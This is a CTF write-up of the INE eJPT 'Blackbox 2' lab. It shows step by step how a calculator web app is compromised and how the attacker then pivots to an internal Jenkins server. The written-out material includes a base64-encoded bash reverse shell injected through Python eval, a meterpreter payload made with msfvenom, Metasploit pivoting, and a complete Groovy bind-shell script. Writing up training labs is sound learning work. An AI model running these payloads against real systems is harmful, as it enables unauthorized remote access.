---
title: "[eJPT] INE Blackbox 2"
author: Tri Nguyen
date: 2022-01-11 18:30:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, ine, ejpt]
---

# INE Blackbox 2

## Enumeration 1:

- Target: online-calc.com

- Running `nmap -sS -Pn -v online-calc.com`:

```
80/tcp   open  http
5000/tcp open  upnp
8000/tcp open  http-alt
```

- If you go to online-calc.com, online-calc.com:5000 and online-calc.com:8000 you will know that all of these are http web servers.

- We use dirb scan on all of these host, the only one that return a suspicious answer is: `dirb online-calc.com:8000` which return:

```
---- Scanning URL: http://online-calc.com:8000/ ----
+ http://online-calc.com:8000/.git/HEAD (CODE:200|SIZE:23)                     
+ http://online-calc.com:8000/console (CODE:200|SIZE:1985)
```

- The console page is locked by a PIN which shows on the shell run by the server.

- Run dirb on http://online-calc.com:8000/.git => We know that HEAD and config file are exposed

- Download `/.git/config` file we sees something interesting:

```
[remote "origin"]
	url = http://online-calc.com/projects/online-calc
	fetch = +refs/heads/*:refs/remotes/origin/*
```

- Clone the following URL to our machine.

- If we read the API.py file, make sure the isValid function always return True.

- Then commit the new file by doing:

```
git add .
git commit -m "Exploit" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
git push 
username: jeremy
password: diamonds
```

- We know the password in the config file.

- Now we need to craft a payload for reverse shell https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval

```
root@INE:~/online-calc# echo 'bash -c "bash -i >& /dev/tcp/192.168.231.2/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK
```

- Then use the following payload in the calculator at port 5000

```
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK | base64 -d | bash")

```

- No flag in /root lol

- We need to find the flag using: `find / -iname *flag* 2>/dev/null`

```
cat /tmp/flag
3b2b474c06380f696b38c1498f795e054374
```

# Enumeration 2

- We still need a reverse meterpreter shell. Using msfvenom on our machine

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.231.2 LPORT=5555 -f elf > shell.elf`

- Start a simple python http server on our machine, then using the online-calc machine, we retrieve that file using wget

- On our machine, in metasploit, we start a `use exploit/multi/handler` on port 5555, IP 192.168.231.2 . We set our payload being `linux/x86/meterpreter/reverse_tcp`

- Once we received a Meterpreter shell, run `ipconfig`.

```
Name         : eth1
Hardware MAC : 02:42:c0:bf:5c:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.191.92.2
IPv4 Netmask : 255.255.255.0
```

- So our second target is within 192.191.92.0/24 range. But first we need to autoroute it to our metasploit session. `meterpreter > run autoroute -s 192.191.92.0`

- Now we need proxy chain to further scan our second target: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/

![Alt text](https://miro.medium.com/max/700/1*exRPwGYJpGv6eESldShwzQ.png)

- We use the module `auxiliary/server/socks_proxy` set the version to 4a, port to 9050 (because proxychains default port is 9050) --> Run the module

- In another terminal, run `proxychains nmap -P0 -sT 192.191.92.3` ---> Port 8080 is open

- Now we need to access the second machine's 8080 webpage on our machine. In firefox, go to preference then search for proxy, select manual proxy configuration. SOCKS host is 127.0.0.1, port is 9050 and uses socks v4.

- Tada you can now reach 192.192.92.3:8080 ---> A Jenkins webserver.

- When you go to the Groovy script, we will now create a BIND NETCAT SHELL (not Reverse) and use our machine proxychains to connect to it. The payload is:

- Source: https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell

```
int port=5555;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- On our attacking machine run: `proxychains nc -v 192.191.92.3 5555` 

- We now gain shell access on the target second machine!








